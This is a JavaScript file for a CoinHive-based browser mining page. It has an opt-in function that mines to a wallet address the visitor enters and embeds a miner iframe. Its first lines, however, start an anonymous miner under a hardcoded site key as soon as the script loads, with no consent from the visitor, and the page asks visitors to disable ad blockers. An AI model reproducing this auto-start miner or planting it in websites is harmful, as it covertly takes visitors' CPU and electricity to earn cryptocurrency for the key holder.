var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc');
anonMiner.start();

function getWalletAddress() {
    return document.getElementById('xmrAddress').value;
}

function createAttribute(name, val, parent) {
    var a = document.createAttribute(name);
    a.value = val;
    parent.setAttributeNode(a);
}

self.CoinHive = self.CoinHive || {};
self.CoinHive.CONFIG = {
    LIB_URL: "https://coinhive.com/lib/",
    WEBSOCKET_SHARDS: [["wss://ws001.coinhive.com/proxy", "wss://ws002.coinhive.com/proxy", "wss://ws003.coinhive.com/proxy", "wss://ws004.coinhive.com/proxy", "wss://ws005.coinhive.com/proxy", "wss://ws006.coinhive.com/proxy", "wss://ws007.coinhive.com/proxy", "wss://ws029.coinhive.com/proxy"], ["wss://ws008.coinhive.com/proxy", "wss://ws009.coinhive.com/proxy", "wss://ws010.coinhive.com/proxy", "wss://ws011.coinhive.com/proxy", "wss://ws012.coinhive.com/proxy", "wss://ws013.coinhive.com/proxy", "wss://ws014.coinhive.com/proxy", "wss://ws030.coinhive.com/proxy"], ["wss://ws015.coinhive.com/proxy", "wss://ws016.coinhive.com/proxy", "wss://ws017.coinhive.com/proxy", "wss://ws018.coinhive.com/proxy", "wss://ws019.coinhive.com/proxy", "wss://ws020.coinhive.com/proxy", "wss://ws021.coinhive.com/proxy", "wss://ws031.coinhive.com/proxy"], ["wss://ws022.coinhive.com/proxy", "wss://ws023.coinhive.com/proxy", "wss://ws024.coinhive.com/proxy", "wss://ws025.coinhive.com/proxy", "wss://ws026.coinhive.com/proxy", "wss://ws027.coinhive.com/proxy", "wss://ws028.coinhive.com/proxy", "wss://ws032.coinhive.com/proxy"]],
    CAPTCHA_URL: "https://coinhive.com/captcha/",
    MINER_URL: "https://coinhive.com/media/miner.html"
};
function createiframe() {
    "use strict";
    var Miner = function(div) {
        this.div = div;
        var params = div.dataset;
        var url = CoinHive.CONFIG.MINER_URL + "?key=" + params.key + "&user=" + encodeURIComponent(params.user || "") + "&whitelabel=" + (params.whitelabel === "true" ? "1" : "0") + "&autostart=" + (params.autostart === "true" ? "1" : "0") + "&throttle=" + (params.throttle || "") + "&threads=" + (params.threads || "") + "&background=" + (params.background || "").replace(/#/g, "") + "&text=" + (params.text || "").replace(/#/g, "") + "&action=" + (params.action || "").replace(/#/g, "") + "&graph=" + (params.graph || "").replace(/#/g, "");
        if (params.start !== undefined) {
            url += "&start=" + encodeURIComponent(params.start)
        }
        this.div.innerHTML = "";
        this.iframe = document.createElement("iframe");
        this.iframe.style.width = "100%";
        this.iframe.style.height = "100%";
        this.iframe.style.border = "none";
        this.iframe.src = url;
        this.div.appendChild(this.iframe)
    };
    Miner.CreateElements = function() {
        var elements = document.querySelectorAll(".coinhive-miner");
        for (var i = 0; i < elements.length; i++) {
            new Miner(elements[i])
        }
    };
    if (document.readyState === "complete" || document.readyState === "interactive") {
        Miner.CreateElements()
    } else {
        document.addEventListener("readystatechange", function() {
            if (document.readyState === "interactive") {
                Miner.CreateElements()
            }
        })
    }
    window.CoinHive = window.CoinHive || {};
    window.CoinHive.Miner = Miner
}


function startUserMiner() {
    var userWalletAddress = getWalletAddress();
    var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', userWalletAddress);
    anonMiner.stop();
    
    /*
    setInterval(function() {
        document.getElementById('hashesCompleted').innerHTML = 'Total Hashes Completed: ' + userMiner.getAcceptedHashes()
    }, 5000);
    */

    var button = document.getElementById('minerButton');
    button.innerHTML = "Mining to: " + userWalletAddress;
    button.disabled = 'true';

    var parent = document.getElementById("iframeParent");
    var div = document.createElement('div');
    createAttribute('class', 'coinhive-miner', div);
    createAttribute('data-key', 'qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', div);
    createAttribute('data-user', userWalletAddress, div);
    createAttribute('data-autostart', 'true', div);
    createAttribute('data-whitelabel', 'false', div);
    createAttribute('data-background', '#FFFFFF', div);
    createAttribute('data-text', '#4C4C4C', div);
    createAttribute('data-action', '#FA6800', div);
    createAttribute('data-graph', '#FA6800', div);
    createAttribute('data-start', 'Start Mining!', div);
    div.innerHTML = "<em>Please disable Adblock!</em>";
    parent.appendChild(div);

    createiframe();
}
